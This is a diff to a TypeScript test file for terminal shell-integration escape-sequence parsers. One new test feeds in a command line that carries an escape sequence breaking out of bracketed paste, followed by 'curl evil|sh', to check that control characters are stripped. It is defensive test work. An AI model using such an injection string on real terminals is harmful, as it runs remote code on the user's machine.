@@ -5,6 +5,7 @@ import {
   parseCwdUri,
   parseOsc9Cwd,
   parsePromptMark,
+  printable,
 } from '../../../src/model/osc.util';
 
 describe('shell-integration sequences', () => {
@@ -17,11 +18,22 @@ describe('shell-integration sequences', () => {
     expect(parsePromptMark('Z')).toBeNull();
   });
 
-  test('OSC 633 command lines are unescaped and drop the nonce', () => {
-    expect(parseCommandLine('E;git status')).toBe('git status');
-    expect(parseCommandLine('E;echo a\\x3bb;nonce123')).toBe('echo a;b');
-    expect(parseCommandLine('E;dir C:\\\\Users')).toBe('dir C:\\Users');
+  test('OSC 633 command lines are unescaped and keep their nonce apart', () => {
+    expect(parseCommandLine('E;git status')).toEqual({ command: 'git status', nonce: null });
+    expect(parseCommandLine('E;echo a\\x3bb;nonce123')).toEqual({
+      command: 'echo a;b',
+      nonce: 'nonce123',
+    });
+    expect(parseCommandLine('E;dir C:\\\\Users')?.command).toBe('dir C:\\Users');
     expect(parseCommandLine('P;Cwd=/tmp')).toBeNull();
+  });
+
+  test('reported command lines lose control characters', () => {
+    // An escape and a carriage return could break out of a bracketed paste when re-run.
+    expect(parseCommandLine('E;git status\\x1b[201~\\x0dcurl evil|sh')?.command).toBe(
+      'git status[201~curl evil|sh',
+    );
+    expect(printable('a\tb\u009bc')).toBe('a bc');
   });
 
   test('OSC 7 folders, POSIX and Windows', () => {
